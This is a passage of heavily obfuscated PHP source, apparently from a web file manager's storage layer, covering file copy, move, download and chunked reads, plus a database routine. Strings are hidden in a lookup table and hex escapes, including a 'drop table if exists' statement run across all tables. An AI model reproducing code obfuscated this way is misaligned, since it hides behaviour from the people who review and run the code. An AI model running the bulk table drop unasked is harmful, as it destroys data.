$cˆöÏ­ï—ô = $this->sqlDecode($c¸†™š´†, $this->type); if (stripos($cˆöÏ­ï—ô, $b¡â÷–”ğì[354]) === 0) { if (!$B¡Ù‡ä±¢) { $B¡Ù‡ä±¢ = $cˆöÏ­ï—ô . $b¡â÷–”ğì[50]; } continue; } if ($Bˆê£È—‰Ø) { $Bˆê£È—‰Ø->task[$b¡â÷–”ğì[1005]] += 1; } $bª¶á“ß·ë++; $b¶„²Ôš× [] = rtrim(rtrim(trim($cˆöÏ­ï—ô), $b¡â÷–”ğì[47]), $b¡â÷–”ğì[68]); if ($bª¶á“ß·ë >= $d³…äò·Á) { $cˆöÏ­ï—ô = $B¡Ù‡ä±¢ . implode($b¡â÷–”ğì[47], $b¶„²Ôš× ); if (!$d“í§æœ³->execute($cˆöÏ­ï—ô)) { return !1; } if ($Bˆê£È—‰Ø) { $Bˆê£È—‰Ø->update($bª¶á“ß·ë); } $b¶„²Ôš×  = array(); $bª¶á“ß·ë = 0; } } goto dîŒ§Ş†ñ; D»…»‘®‘¥: } public function dropTable($DÏäºÀÁˆ’ = null) { $a‡‡®’ãõœ = $this->model()->db(); $Cö“¶‰™Ï = $DÏäºÀÁˆ’ ? array($DÏäºÀÁˆ’) : $a‡‡®’ãõœ->getTables(); if (!$Cö“¶‰™Ï) { return; } foreach ($Cö“¶‰™Ï as $DÏäºÀÁˆ’) { $a‡‡®’ãõœ->execute("\x64\162\x6f\x70\40\x74\141\x62\x6c\145\x20\x69\146\40\x65\170\x69\163\x74\163\40\x60{$DÏäºÀÁˆ’}\x60"); } } private function taskToCache($bøÏÂ§Á¥¦ = null) { $b¦§†ª¾ˆÓ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$bøÏÂ§Á¥¦) { return; } $Bº±áÑÁª´ = array($b¦§†ª¾ˆÓ[1007] => $bøÏÂ§Á¥¦->task[$b¦§†ª¾ˆÓ[1007]], $b¦§†ª¾ˆÓ[1005] => $bøÏÂ§Á¥¦->task[$b¦§†ª¾ˆÓ[1005]], $b¦§†ª¾ˆÓ[1019] => $bøÏÂ§Á¥¦->task[$b¦§†ª¾ˆÓ[1019]]); if ($Bº±áÑÁª´[$b¦§†ª¾ˆÓ[1005]] == $Bº±áÑÁª´[$b¦§†ª¾ˆÓ[1019]]) { $Bº±áÑÁª´[$b¦§†ª¾ˆÓ[704]] = 1; } Cache::set($b¦§†ª¾ˆÓ[1020] . $bøÏÂ§Á¥¦->task[$b¦§†ª¾ˆÓ[392]], $Bº±áÑÁª´); $bøÏÂ§Á¥¦->end(); } private function sqlEncode($cÁâãÀíÜÎ) { $EÊÓö²ëñ =& $_SERVER[Ïº«‚ßèÔˆø]; $e›ğ¯àÜáŠ = array(); foreach ($cÁâãÀíÜÎ as $fÒ¢»¢ˆ•) { if (is_array($fÒ¢»¢ˆ•)) { $fÒ¢»¢ˆ• = json_encode_force($fÒ¢»¢ˆ•); } $fÒ¢»¢ˆ• = addslashes($fÒ¢»¢ˆ•); $fÒ¢»¢ˆ• = str_replace(array($EÊÓö²ëñ[1021], $EÊÓö²ëñ[228]), array($EÊÓö²ëñ[1022], $EÊÓö²ëñ[1023]), $fÒ¢»¢ˆ•); $e›ğ¯àÜáŠ[] = str_replace($EÊÓö²ëñ[55], $EÊÓö²ëñ[1024], $fÒ¢»¢ˆ•); } return $EÊÓö²ëñ[55] . implode($EÊÓö²ëñ[1025], $e›ğ¯àÜáŠ) . $EÊÓö²ëñ[55]; } private function sqlDecode($AÛŸÜ¬¥›, $f¾ÓÉªºİ¨) { $D’ïŸ·Ãİ =& $_SERVER[Ïº«‚ßèÔˆø]; $AÛŸÜ¬¥› = str_replace(array($D’ïŸ·Ãİ[1022], $D’ïŸ·Ãİ[1023]), array($D’ïŸ·Ãİ[1021], $D’ïŸ·Ãİ[228]), $AÛŸÜ¬¥›); if ($f¾ÓÉªºİ¨ == $D’ïŸ·Ãİ[9]) { $AÛŸÜ¬¥› = stripslashes($AÛŸÜ¬¥›); } return $AÛŸÜ¬¥›; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($CàğÃ°ê²³, $Eó„ğ¤†Ÿ) { goto déç–©—Ü™; déç–©—Ü™: $d¾†í·ß›™ =& $_SERVER[Ïº«‚ßèÔˆø]; $DÁ‚¯Ì¥…— = $Eó„ğ¤†Ÿ; $GLOBALS[$d¾†í·ß›™[1026]] = $d¾†í·ß›™[1027] . $CàğÃ°ê²³; goto DœİŒŒøé¸; DœİŒŒøé¸: Hook::trigger($d¾†í·ß›™[1027] . $CàğÃ°ê²³ . $d¾†í·ß›™[1028], $DÁ‚¯Ì¥…—); $D²‰¬ÆÏ»¼ = self::driverMake($Eó„ğ¤†Ÿ[0]); if (method_exists($D²‰¬ÆÏ»¼, $CàğÃ°ê²³)) { $CÇè†ÁÇë = @call_user_func_array(array($D²‰¬ÆÏ»¼, $CàğÃ°ê²³), $Eó„ğ¤†Ÿ); } else { if (method_exists($D²‰¬ÆÏ»¼, $d¾†í·ß›™[1029])) { $CÇè†ÁÇë = @call_user_func_array(array($D²‰¬ÆÏ»¼, $CàğÃ°ê²³), $Eó„ğ¤†Ÿ); } else { if (method_exists(self, $CàğÃ°ê²³)) { $CÇè†ÁÇë = @call_user_func_array(array(self, $CàğÃ°ê²³), $Eó„ğ¤†Ÿ); } else { $CÇè†ÁÇë = call_user_func_array(array(parent, $CàğÃ°ê²³), $Eó„ğ¤†Ÿ); } } } goto E³˜º®›·; E³˜º®›·: Hook::trigger($d¾†í·ß›™[1027] . $CàğÃ°ê²³ . $d¾†í·ß›™[1030], $DÁ‚¯Ì¥…—, $CÇè†ÁÇë); return $CÇè†ÁÇë; goto eÕø¿×‘—; eÕø¿×‘—: } public static function init($aæâ‚õ¹•±) { return self::driverMake($aæâ‚õ¹•±); } public static function copy($F’Â©¿‘·î, $AÈô ßÅØŒ, $cñÃ¹ÚÅĞ = false, $c‹áïÈö²¢ = false) { return self::copyMoveStart($F’Â©¿‘·î, $AÈô ßÅØŒ, $cñÃ¹ÚÅĞ, $_SERVER[Ïº«‚ßèÔˆø][517], $c‹áïÈö²¢); } public static function move($bÍÌ÷Šé¦š, $eÉù½Õ±½¶, $aá—ê®öÛ† = false, $e¨£Ë¨¸æĞ = false) { return self::copyMoveStart($bÍÌ÷Šé¦š, $eÉù½Õ±½¶, $aá—ê®öÛ†, $_SERVER[Ïº«‚ßèÔˆø][519], $e¨£Ë¨¸æĞ); } private static function copyMoveStart($BŞÁ…Á†«è, $fˆèº¯çßŠ, $cËí¹µÒ˜», $B²ª¼ÅŞ‡, $c›¯Ô¡á¹Û) { $aÕîíàÏ–Á =& $_SERVER[Ïº«‚ßèÔˆø]; $aª……öÛ¬ = array($BŞÁ…Á†«è, $fˆèº¯çßŠ, $cËí¹µÒ˜», $c›¯Ô¡á¹Û); Hook::trigger($aÕîíàÏ–Á[1027] . $B²ª¼ÅŞ‡ . $aÕîíàÏ–Á[1028], $aª……öÛ¬); $aàŒ‚±·†á = self::copyMove($BŞÁ…Á†«è, $fˆèº¯çßŠ, $cËí¹µÒ˜», $B²ª¼ÅŞ‡, $c›¯Ô¡á¹Û); Hook::trigger($aÕîíàÏ–Á[1027] . $B²ª¼ÅŞ‡ . $aÕîíàÏ–Á[1030], $aª……öÛ¬, $aàŒ‚±·†á); return $aàŒ‚±·†á; } public static function saveFile($DÚõâ‘æ•÷, $C‡ªìĞ„îê, $D» ˆ¬§Û = true) { goto b±©ƒïÇ¨Ï; E’¤´ÃÒŞã: $D²íœ¿‡Ú¾ = self::driverMake($C‡ªìĞ„îê); $dÅ…º–¡—‹ = !1; if ($D²íœ¿‡Ú¾->pathParse[$B°ÊÚÙ›áò[1031]]) { $E¿í½â™ì¥ = $D²íœ¿‡Ú¾->pathParse[$B°ÊÚÙ›áò[1031]]; $dÅ…º–¡—‹ = $D²íœ¿‡Ú¾; $D²íœ¿‡Ú¾ = self::driverMake($E¿í½â™ì¥); } goto DÀÁÄ‚ÚÄÑ; DÀÁÄ‚ÚÄÑ: $cŞƒŞïŠ¼¿ = $D²íœ¿‡Ú¾->pathFather($C‡ªìĞ„îê); $DøµÒ„ƒ·— = !0; if (!$D» ˆ¬§Û && self::driverIsSame($dÊĞÖÊÂ, $D²íœ¿‡Ú¾)) { $DøµÒ„ƒ·— = !1; } goto B«Ã†ìì…÷; B«Ã†ìì…÷: $b‰÷Ù¢ğÀÑ = self::copyFile($dÊĞÖÊÂ, $DÚõâ‘æ•÷, $D²íœ¿‡Ú¾, $cŞƒŞïŠ¼¿, $FêæøßÉ‚[$B°ÊÚÙ›áò[28]], $DøµÒ„ƒ·—); if ($dÅ…º–¡—‹) { $b‰÷Ù¢ğÀÑ = $dÅ…º–¡—‹->getPathOuter($b‰÷Ù¢ğÀÑ); } return $b‰÷Ù¢ğÀÑ; goto bï¬ëë Ÿ; b±©ƒïÇ¨Ï: $B°ÊÚÙ›áò =& $_SERVER[Ïº«‚ßèÔˆø]; $FêæøßÉ‚ = self::info($C‡ªìĞ„îê); $dÊĞÖÊÂ = self::driverMake($DÚõâ‘æ•÷); goto E’¤´ÃÒŞã; bï¬ëë Ÿ: } private static function copyMove($fËâ‰È‚™‰, $f§ôİ¬£ë—, $a¢Çå‰“Ü, $aÒ¥õÔ¦î°, $CÔ«÷—Ì¶ = false) { goto e¢¢Á«Å±Ü; A–ĞÙì§©Ş: $fÔÁŒøÆø = $BÙâÊÀ§Ş­->isFile($fËâ‰È‚™‰); if (!$fÔÁŒøÆø && $cÙËË”µäß->getType() == $EªÁ²§¹¡ˆ[702] && $BÙâÊÀ§Ş­->getType() == $EªÁ²§¹¡ˆ[106]) { $E—²¶ç®öã = $cÙËË”µäß->copyFolderFromIO($BÙâÊÀ§Ş­, $fËâ‰È‚™‰, $f§ôİ¬£ë—, $a¢Çå‰“Ü, $Bš¨­¡Ì„, $CÔ«÷—Ì¶); } else { $E—²¶ç®öã = self::copyPath($BÙâÊÀ§Ş­, $fËâ‰È‚™‰, $cÙËË”µäß, $f§ôİ¬£ë—, $a¢Çå‰“Ü, $Bš¨­¡Ì„, $fÔÁŒøÆø, $CÔ«÷—Ì¶); } if ($E—²¶ç®öã && $Bš¨­¡Ì„) { $BÙâÊÀ§Ş­->remove($fËâ‰È‚™‰); } goto bŠÍÂ®Ş; eêµÕˆÄ…: $d¡ñä¶Ó½å = !1; if ($cÙËË”µäß->pathParse[$EªÁ²§¹¡ˆ[1031]]) { $f§ôİ¬£ë— = $cÙËË”µäß->pathParse[$EªÁ²§¹¡ˆ[1031]]; $d¡ñä¶Ó½å = $cÙËË”µäß; $cÙËË”µäß = self::driverMake($f§ôİ¬£ë—); } self::check($BÙâÊÀ§Ş­, $fËâ‰È‚™‰, $cÙËË”µäß, $f§ôİ¬£ë—); goto c…Œñø×Ê; bŠÍÂ®Ş: if ($d¡ñä¶Ó½å) { $E—²¶ç®öã = $d¡ñä¶Ó½å->getPathOuter($E—²¶ç®öã); } return $E—²¶ç®öã; goto f´ÅÇËÀ; e¢¢Á«Å±Ü: $EªÁ²§¹¡ˆ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$fËâ‰È‚™‰ || $fËâ‰È‚™‰ == $EªÁ²§¹¡ˆ[8] || !$f§ôİ¬£ë—) { return !1; } ignore_timeout(); goto EÚĞæ°¯–; c…Œñø×Ê: Hook::trigger($EªÁ²§¹¡ˆ[73], $BÙâÊÀ§Ş­, $fËâ‰È‚™‰, $cÙËË”µäß, $f§ôİ¬£ë—); $Fëïî¿éã = self::driverIsSame($BÙâÊÀ§Ş­, $cÙËË”µäß); if ($Fëïî¿éã) { if ($aÒ¥õÔ¦î° == $EªÁ²§¹¡ˆ[519] && !method_exists($cÙËË”µäß, $EªÁ²§¹¡ˆ[1032]) && trim($f§ôİ¬£ë—, $EªÁ²§¹¡ˆ[8]) == trim($cÙËË”µäß->pathFather($fËâ‰È‚™‰), $EªÁ²§¹¡ˆ[8])) { if ($BÙâÊÀ§Ş­->pathThis($fËâ‰È‚™‰) != $CÔ«÷—Ì¶ && !$BÙâÊÀ§Ş­->isTypeObject()) { return $BÙâÊÀ§Ş­->rename($fËâ‰È‚™‰, $CÔ«÷—Ì¶); } return $cÙËË”µäß->getPathOuter($fËâ‰È‚™‰); } if (method_exists($cÙËË”µäß, $aÒ¥õÔ¦î°)) { return $cÙËË”µäß->{$aÒ¥õÔ¦î°}($fËâ‰È‚™‰, $f§ôİ¬£ë—, $a¢Çå‰“Ü); } } goto A–ĞÙì§©Ş; EÚĞæ°¯–: $BÙâÊÀ§Ş­ = self::driverMake($fËâ‰È‚™‰); $cÙËË”µäß = self::driverMake($f§ôİ¬£ë—); $Bš¨­¡Ì„ = $aÒ¥õÔ¦î° == $EªÁ²§¹¡ˆ[519]; goto eêµÕˆÄ…; f´ÅÇËÀ: } private static function check($E›ùçÈ˜Û¢, $Cğ˜¡™¯¬, $fÊÈñ£é, &$Aì§ÙçØ‹—) { $eáˆšİ¾×¤ =& $_SERVER[Ïº«‚ßèÔˆø]; if (self::driverIsSame($E›ùçÈ˜Û¢, $fÊÈñ£é) && $E›ùçÈ˜Û¢->isFolder($Cğ˜¡™¯¬) && $E›ùçÈ˜Û¢->isParentOf($Cğ˜¡™¯¬, $Aì§ÙçØ‹—)) { show_json(LNG($eáˆšİ¾×¤[1033]), !1); } if (!$E›ùçÈ˜Û¢->exist($Cğ˜¡™¯¬)) { show_json(LNG($eáˆšİ¾×¤[105]), !1); } } private static function copyPath($eÙ¤½‹ƒ¦ê, $BŠÎ¾¹ßÉ, $eÒ‘Á÷‘œµ, $a¬À‘êŒ¥–, $d´–Œ±ë™, $dŠãñˆÄ«æ, $dÇá‡åÀä, $eğ—Èİêö = false) { goto A¸‘‹òÃ¨Ã; BÌ¬—¾£İ: $DáÒöµ…ƒ¯ = is_array($DáÒöµ…ƒ¯) ? $DáÒöµ…ƒ¯ : array($Fêëš²‘÷Á[74] => array(), $Fêëš²‘÷Á[75] => array()); $fƒ«š†™æ» = array_merge($DáÒöµ…ƒ¯[$Fêëš²‘÷Á[74]], $DáÒöµ…ƒ¯[$Fêëš²‘÷Á[75]]); foreach ($fƒ«š†™æ» as $EÚÈà‚±·÷) { $cìŸ«æ†“« = $EÚÈà‚±·÷[$Fêëš²‘÷Á[29]] == $Fêëš²‘÷Á[192]; $BŠÎ¾¹ßÉ = $eÙ¤½‹ƒ¦ê->getPathInner($EÚÈà‚±·÷[$Fêëš²‘÷Á[76]]); $EÙ×î©¿ÌÅ = self::copyPath($eÙ¤½‹ƒ¦ê, $BŠÎ¾¹ßÉ, $eÒ‘Á÷‘œµ, $a¬À‘êŒ¥–, $d´–Œ±ë™, $dŠãñˆÄ«æ, $cìŸ«æ†“«); if (!$EÙ×î©¿ÌÅ) { IO::errorTips($Fêëš²‘÷Á[1034] . $BŠÎ¾¹ßÉ . $Fêëš²‘÷Á[67] . $a¬À‘êŒ¥–); } } goto DäŒ†àİ˜ğ; A¸‘‹òÃ¨Ã: $Fêëš²‘÷Á =& $_SERVER[Ïº«‚ßèÔˆø]; $b¦ò°¿Œ» = $eğ—Èİêö ? $eğ—Èİêö : $eÙ¤½‹ƒ¦ê->pathThis($BŠÎ¾¹ßÉ); if ($d´–Œ±ë™) { $cÁ½´õ”¦ = $eÒ‘Á÷‘œµ->fileNameExist($a¬À‘êŒ¥–, $b¦ò°¿Œ»); $b¦ò°¿Œ» = $eÒ‘Á÷‘œµ->fileNameAuto($a¬À‘êŒ¥–, $b¦ò°¿Œ», $d´–Œ±ë™, !$dÇá‡åÀä); $d´–Œ±ë™ = $cÁ½´õ”¦ ? $d´–Œ±ë™ : !1; } goto a³Ñ×ˆ¤£õ; DäŒ†àİ˜ğ: self::copyMoveKeepInfo($eÙ¤½‹ƒ¦ê, $BŠÎ¾¹ßÉ, $CëåáùÀ†); return $CëåáùÀ†; goto F®ÃÑ•Éˆ„; D„ç›Ñİ£É: $CëåáùÀ† = $eÒ‘Á÷‘œµ->mkdir($eÒ‘Á÷‘œµ->getPath($a±±±§á¥†)); $a¬À‘êŒ¥– = $eÒ‘Á÷‘œµ->getPathInner($CëåáùÀ†); $DáÒöµ…ƒ¯ = $eÙ¤½‹ƒ¦ê->listPath($BŠÎ¾¹ßÉ, !0); goto BÌ¬—¾£İ; a³Ñ×ˆ¤£õ: if ($dÇá‡åÀä) { return self::copyFile($eÙ¤½‹ƒ¦ê, $BŠÎ¾¹ßÉ, $eÒ‘Á÷‘œµ, $a¬À‘êŒ¥–, $b¦ò°¿Œ», $dŠãñˆÄ«æ); } if ($d´–Œ±ë™ == REPEAT_RENAME_FOLDER) { $d´–Œ±ë™ = !1; } $a±±±§á¥† = rtrim($a¬À‘êŒ¥–, $Fêëš²‘÷Á[8]) . $Fêëš²‘÷Á[8] . $b¦ò°¿Œ»; goto D„ç›Ñİ£É; F®ÃÑ•Éˆ„: } private static function copyFile($c«Ñ †Ãİ, $Dö©ˆ¹ Æ‚, $B¡’è¶ö¼“, $FâÌÎôø‘, $d¼À²‚§Í¾, $CâÓ¢±ª®¯) { goto cÊ¾¢°Ìì©; e‚´¶Öí¬î: mk_dir($fàØº‡‡§ª); $F„ŠÑÇôÅå = $fàØº‡‡§ª . $d—…„ˆï; $CĞõÓÛ¿Äà = $F„ŠÑÇôÅå; goto d„²¤÷òÈ‰; Cê¹÷ÕÍ: Hook::trigger($Eíß…çî[1036], $c«Ñ †Ãİ, $Dö©ˆ¹ Æ‚, $B¡’è¶ö¼“, $FâÌÎôø‘, $d¼À²‚§Í¾, $d—…„ˆï); if (self::driverIsSame($c«Ñ †Ãİ, $B¡’è¶ö¼“)) { if ($CâÓ¢±ª®¯) { $Dãè‡ÒÙ = $B¡’è¶ö¼“->moveFile($Dö©ˆ¹ Æ‚, $FâÌÎôø‘); } else { $Dãè‡ÒÙ = $B¡’è¶ö¼“->copyFile($Dö©ˆ¹ Æ‚, $FâÌÎôø‘); } Hook::trigger($Eíß…çî[1037], $c«Ñ †Ãİ, $Dö©ˆ¹ Æ‚, $B¡’è¶ö¼“, $FâÌÎôø‘, $d¼À²‚§Í¾, $Dãè‡ÒÙ); self::copyMoveKeepInfo($c«Ñ †Ãİ, $Dö©ˆ¹ Æ‚, $Dãè‡ÒÙ); return $Dãè‡ÒÙ; } $A©İª±• = TEMP_FILES; goto eÏÄ»Éà½š; cîİ‡³ª‡ò: self::remove($CĞõÓÛ¿Äà); Hook::trigger($Eíß…çî[1037], $c«Ñ †Ãİ, $Dö©ˆ¹ Æ‚, $B¡’è¶ö¼“, $FâÌÎôø‘, $d¼À²‚§Í¾, $Dãè‡ÒÙ); self::copyMoveKeepInfo($c«Ñ †Ãİ, $Dö©ˆ¹ Æ‚, $Dãè‡ÒÙ); goto FíØ¹‰¬‚; FíØ¹‰¬‚: return $Dãè‡ÒÙ; goto a³‹åİÍÁƒ; cÊ¾¢°Ìì©: $Eíß…çî =& $_SERVER[Ïº«‚ßèÔˆø]; $FâÌÎôø‘ = $B¡’è¶ö¼“->getPath(rtrim($FâÌÎôø‘, $Eíß…çî[8]) . $Eíß…çî[8] . $d¼À²‚§Í¾); $d—…„ˆï = $Eíß…çî[1035] . time() . rand_string(5); goto Cê¹÷ÕÍ; eÏÄ»Éà½š: if ($GLOBALS[$Eíß…çî[6]][$Eíß…çî[88]][$Eíß…çî[744]]) { $A©İª±• = $GLOBALS[$Eíß…çî[6]][$Eíß…çî[88]][$Eíß…çî[744]]; } $CâÓ¢±ª®¯ = !0; $fàØº‡‡§ª = $A©İª±•; goto e‚´¶Öí¬î; d„²¤÷òÈ‰: $F„ŠÑÇôÅå = $c«Ñ †Ãİ->download($Dö©ˆ¹ Æ‚, $F„ŠÑÇôÅå); $F„ŠÑÇôÅå = $c«Ñ †Ãİ->iconvApp($F„ŠÑÇôÅå); $Dãè‡ÒÙ = $B¡’è¶ö¼“->upload($FâÌÎôø‘, $F„ŠÑÇôÅå, $CâÓ¢±ª®¯); goto cîİ‡³ª‡ò; a³‹åİÍÁƒ: } private function copyMoveKeepInfo($EÙ†‘Ø¸¤, $a µËÇŒ‰, $C¤ŒåèĞÓ) { if (!$C¤ŒåèĞÓ) { return; } $Câ¬àòøÎÀ = $EÙ†‘Ø¸¤->info($a µËÇŒ‰); if (!is_array($Câ¬àòøÎÀ)) { return; } IO::setModifyTime($C¤ŒåèĞÓ, $Câ¬àòøÎÀ[$_SERVER[Ïº«‚ßèÔˆø][84]]); } public static function pathFather($dÁÛ¤„Ş×) { $D¥ˆ—ˆ—ò = IO::init($dÁÛ¤„Ş×); $Dß´º™²‹Í = $D¥ˆ—ˆ—ò->pathFather($D¥ˆ—ˆ—ò->path); return $D¥ˆ—ˆ—ò->getPathOuter($Dß´º™²‹Í); } public static function fileOut($d£‡İ–¯º, $B—¼¨òìº = false, $cŞÒ‘²ñ = false, $A‡³”‚Õ = '') { $D®®‰†Áö = self::driverMake($d£‡İ–¯º); if ($D®®‰†Áö->isFileOutServer()) { return $D®®‰†Áö->fileOutServer($d£‡İ–¯º, $B—¼¨òìº, $cŞÒ‘²ñ, $A‡³”‚Õ); } return $D®®‰†Áö->fileOut($d£‡İ–¯º, $B—¼¨òìº, $cŞÒ‘²ñ, $A‡³”‚Õ); } public static function fileOutImage($a¬¹æÓÄ³, $A­¢÷ÌËäâ = 250) { $b–Ô‚Ú¦Ûà = array(250, 600, 1200, 3000, 5000); for ($E‰öÁÎÀšÒ = 0; $E‰öÁÎÀšÒ < count($b–Ô‚Ú¦Ûà); $E‰öÁÎÀšÒ++) { if ($E‰öÁÎÀšÒ == 0 && $A­¢÷ÌËäâ <= $b–Ô‚Ú¦Ûà[$E‰öÁÎÀšÒ]) { $A­¢÷ÌËäâ = $b–Ô‚Ú¦Ûà[$E‰öÁÎÀšÒ]; break; } else { if ($A­¢÷ÌËäâ > $b–Ô‚Ú¦Ûà[$E‰öÁÎÀšÒ - 1] && $A­¢÷ÌËäâ <= $b–Ô‚Ú¦Ûà[$E‰öÁÎÀšÒ]) { $A­¢÷ÌËäâ = $b–Ô‚Ú¦Ûà[$E‰öÁÎÀšÒ]; break; } else { if ($E‰öÁÎÀšÒ == count($b–Ô‚Ú¦Ûà) - 1 && $A­¢÷ÌËäâ > $b–Ô‚Ú¦Ûà[$E‰öÁÎÀšÒ]) { $A­¢÷ÌËäâ = $b–Ô‚Ú¦Ûà[$E‰öÁÎÀšÒ]; break; } } } } $DÜĞ£­ğÓø = self::driverMake($a¬¹æÓÄ³); if ($DÜĞ£­ğÓø->isFileOutServer()) { return $DÜĞ£­ğÓø->fileOutImageServer($a¬¹æÓÄ³, $A­¢÷ÌËäâ); } return $DÜĞ£­ğÓø->fileOutImage($a¬¹æÓÄ³, $A­¢÷ÌËäâ); } private static function driverIsSame($dï±ŸÁÇŠ, $dî¢ìÎÃ) { goto B÷ó‰²ñ¹„; B÷ó‰²ñ¹„: $A‘ƒõ¶ôŠª =& $_SERVER[Ïº«‚ßèÔˆø]; $a™ˆ‡ÄÊ‰Ø = $dï±ŸÁÇŠ->getType(); $c¸ñ©Ïœ = $dî¢ìÎÃ->getType(); goto D½ÙŠŠºº; D½ÙŠŠºº: if ($a™ˆ‡ÄÊ‰Ø != $c¸ñ©Ïœ) { return !1; } if ($a™ˆ‡ÄÊ‰Ø == $A‘ƒõ¶ôŠª[702]) { return !0; } if ($a™ˆ‡ÄÊ‰Ø == $A‘ƒõ¶ôŠª[106]) { return !0; } goto F–¥èïğß; F–¥èïğß: if ($dï±ŸÁÇŠ->pathDriver == $dî¢ìÎÃ->pathDriver) { return !0; } return !1; goto Aùãßõ‰£; Aùãßõ‰£: } public static function copyUpdate($B—à­”“Ïº, $B’Ú¢êÕ‚) { goto E“‹¾©; c³«ƒÔŒÍ¨: $F±Èåø”Œ = array(); foreach ($aâ¨—âåæ¶ as $E‡é‘ÁŒíÁ => $b©ß¬…²·) { if (isset($f ˆã½¨¢[$E‡é‘ÁŒíÁ])) { if ($b©ß¬…²·[$AÃ°æŸÕê[77]] == 1) { continue; } if ($f ˆã½¨¢[$E‡é‘ÁŒíÁ][$AÃ°æŸÕê[78]] == $b©ß¬…²·[$AÃ°æŸÕê[78]]) { continue; } } if ($b©ß¬…²·[$AÃ°æŸÕê[77]] == 1) { $F±Èåø”Œ[] = $B’Ú¢êÕ‚ . $AÃ°æŸÕê[8] . $E‡é‘ÁŒíÁ; continue; } $dØàá²çØô = strstr(trim($E‡é‘ÁŒíÁ, $AÃ°æŸÕê[8]), $AÃ°æŸÕê[8]) ? get_path_father($E‡é‘ÁŒíÁ) : $AÃ°æŸÕê[33]; $E…Öì‚Ø»[] = array($AÃ°æŸÕê[1038] => $b©ß¬…²·[$AÃ°æŸÕê[76]], $AÃ°æŸÕê[1039] => rtrim($B’Ú¢êÕ‚, $AÃ°æŸÕê[8]) . $AÃ°æŸÕê[8] . $dØàá²çØô, $AÃ°æŸÕê[1040] => $b©ß¬…²·); } $F’é¼Îª¢ = array($AÃ°æŸÕê[192] => $E…Öì‚Ø», $AÃ°æŸÕê[77] => $F±Èåø”Œ); goto F’çßíæÚ; E“‹¾©: $AÃ°æŸÕê =& $_SERVER[Ïº«‚ßèÔˆø]; if (!IO::exist($B—à­”“Ïº)) { return !1; } if (!IO::exist($B’Ú¢êÕ‚)) { IO::mkdir($B’Ú¢êÕ‚); } goto B‡Í®‘‘ŒÇ; B‡Í®‘‘ŒÇ: $aâ¨—âåæ¶ = self::_listAll($B—à­”“Ïº); $f ˆã½¨¢ = self::_listAll($B’Ú¢êÕ‚); $E…Öì‚Ø» = array(); goto c³«ƒÔŒÍ¨; F’çßíæÚ: Hook::trigger($AÃ°æŸÕê[1041], $B—à­”“Ïº, $B’Ú¢êÕ‚, $F’é¼Îª¢); foreach ($F±Èåø”Œ as $b©ß¬…²·) { IO::mkdir($b©ß¬…²·); } foreach ($E…Öì‚Ø» as $b©ß¬…²·) { IO::copy($b©ß¬…²·[$AÃ°æŸÕê[1038]], $b©ß¬…²·[$AÃ°æŸÕê[1039]], REPEAT_REPLACE); } goto CÚÍ“ã®§ˆ; CÚÍ“ã®§ˆ: } private static function _listAll($fñ•İ†Æö) { $aÏ‡¾¹ô =& $_SERVER[Ïº«‚ßèÔˆø]; $fñ•İ†Æö = KodIO::clear($fñ•İ†Æö); $eÙŞÈ”›Úà = IO::listAll($fñ•İ†Æö); foreach ($eÙŞÈ”›Úà as &$d‡ã¯íÔ) { $eÒ†¼•îÎì = substr($d‡ã¯íÔ[$aÏ‡¾¹ô[76]], strlen($fñ•İ†Æö)); $d‡ã¯íÔ[$aÏ‡¾¹ô[1042]] = trim($eÒ†¼•îÎì, $aÏ‡¾¹ô[8]); } unset($d‡ã¯íÔ); return array_to_keyvalue($eÙŞÈ”›Úà, $aÏ‡¾¹ô[1042]); } public static function fileSubstr($a«ñĞ¤ğ«Ì, $b•¡õ»«…ê, $E§“í«˜ˆ = false) { goto EÀƒˆõ§ç; B°Ÿ’çàÓ¤: if (!$Då¹§ œ£ && $E§“í«˜ˆ && isset($GLOBALS[$aïÚœÆ–â¾[1045]])) { throw new Exception($GLOBALS[$aïÚœÆ–â¾[1045]][$aïÚœÆ–â¾[1046]]); } return $Då¹§ œ£; goto BÎœ×ºí‹Æ; d¡îŒ¶Ö¡: if ($E§“í«˜ˆ === !1) { $E§“í«˜ˆ = $Bßîòñ¹„ - $b•¡õ»«…ê; } if ($b•¡õ»«…ê + $E§“í«˜ˆ > $Bßîòñ¹„) { $E§“í«˜ˆ = $Bßîòñ¹„ - $b•¡õ»«…ê; } if (!$Bßîòñ¹„ && $EŒÖ‚‰->getType() == $aïÚœÆ–â¾[106] && !$EŒÖ‚‰->exist($a«ñĞ¤ğ«Ì)) { throw new Exception($aïÚœÆ–â¾[1043] . LNG($aïÚœÆ–â¾[1044]) . $aïÚœÆ–â¾[908] . get_path_this($a«ñĞ¤ğ«Ì) . $aïÚœÆ–â¾[33]); } goto f¬Ÿ¡Œ‹; EÀƒˆõ§ç: $aïÚœÆ–â¾ =& $_SERVER[Ïº«‚ßèÔˆø]; $EŒÖ‚‰ = self::driverMake($a«ñĞ¤ğ«Ì); $Bßîòñ¹„ = $EŒÖ‚‰->size($a«ñĞ¤ğ«Ì); goto BæÍÂ£ãÒ; f¬Ÿ¡Œ‹: if ($E§“í«˜ˆ <= 0) { return $aïÚœÆ–â¾[33]; } if ($b•¡õ»«…ê < 0 || $b•¡õ»«…ê >= $Bßîòñ¹„ || $E§“í«˜ˆ > 1024 * 1024 * 5) { throw new Exception("\x66\151\154\145\x52\145\141\x64\40\145\162\162\x6f\x72\41\x20\x73\164\141\x72\x74\75{$b•¡õ»«…ê}\x3b\154\145\x6e\147\164\x68\x3d{$E§“í«˜ˆ}\x3b\x20\x73\151\172\145\x3d{$Bßîòñ¹„}\73"); } $Då¹§ œ£ = $EŒÖ‚‰->fileSubstr($a«ñĞ¤ğ«Ì, $b•¡õ»«…ê, $E§“í«˜ˆ); goto B°Ÿ’çàÓ¤; BæÍÂ£ãÒ: $b×Ö‰Ößâ = $b•¡õ»«…ê; $E¾ŸİÛ¦À = $E§“í«˜ˆ; if ($b•¡õ»«…ê < 0) { $b•¡õ»«…ê = $Bßîòñ¹„ + $b•¡õ»«…ê; } goto d¡îŒ¶Ö¡; BÎœ×ºí‹Æ: } private static function driverMake(&$DÅ“£Úè¦Í) { goto A°ŸêÇÔñŸ; A°ŸêÇÔñŸ: $Eãİ† ×µ¤ =& $_SERVER[Ïº«‚ßèÔˆø]; $d“ºÏÓÄ = KodIO::parse($DÅ“£Úè¦Í); if (!self::$driverListSystem) { $b´Æ‹Ôƒ•ï = Model($Eãİ† 